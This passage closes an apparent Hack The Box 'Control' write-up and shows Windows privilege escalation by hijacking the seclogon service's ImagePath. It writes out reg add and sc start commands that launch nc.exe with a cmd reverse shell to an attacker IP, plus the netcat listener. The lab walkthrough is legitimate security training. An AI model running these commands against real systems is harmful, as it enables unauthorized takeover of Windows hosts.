<br /><br />

With this **Privilege** or **misconfiguration** I can exploit a vulnerability in the **seclogon service** that would allow me to **Escalate Privileges**. I only need to modify the service registry, and taking advantage of the fact that I already have `nc.exe` available on the victim machine, I only need to modify the **ImagePath** value to replace the path of the executable used to start the service with the `nc.exe`. I start the service but I do not succeed in catching the incoming **Reverse Shell** with `nc` on port **445**, I think it is because I'm in a **PowerShell** shell, so I will return to the **CMD** shell and perform all the steps again (<ins>unfortunately I had to reset the box</ins>). This time I do succeed in getting the **Reverse Shell** and my **Escalate Privileges goal** as well as accessing the contents of the last flag. Machine pwned.

> The **"seclogon"** service in **Windows**, also known as **Secondary Logon**, allows users to run processes under different security credentials. This is often used to **elevate privileges**, such as running an application as an **administrator** while logged in as a **standard** user. While not inherently malicious, disabling it can restrict the ability to run programs with elevated privileges.

> **Victime Machine**:

```cmd
sc query seclogon
reg query "HKLM\system\currentcontrolset\services\seclogon"

dir C:\Windows\System32\spool\drivers\color

reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.5 443" /f
reg query "HKLM\system\currentcontrolset\services\seclogon"
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 445
```

> **Victime Machine**:

```cmd
sc start seclogon

exit
sc query seclogon
# Started, I must reset box :(

sc query seclogon
reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.5 449" /f
reg query "HKLM\system\currentcontrolset\services\seclogon"
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 449
```

> **Victime Machine**:

```cmd
sc start seclogon

whoami
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/control_writeup/Control_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another excellent box from the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, in which I was able to remember and re-practice exploitation methods that can be found in different laboratories or real environments. The satisfaction achieved, the fun, even the frustration are the sensations I'm left with after finishing each machine. **Windows OS** is my weakness, that's why I enjoy so much confronting, investigating and engaging the environments in which it is used. I'm going to kill the box because I already want to go for the next one.

<br /><br />
<img src="{{ site.img_path }}/control_writeup/Control_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
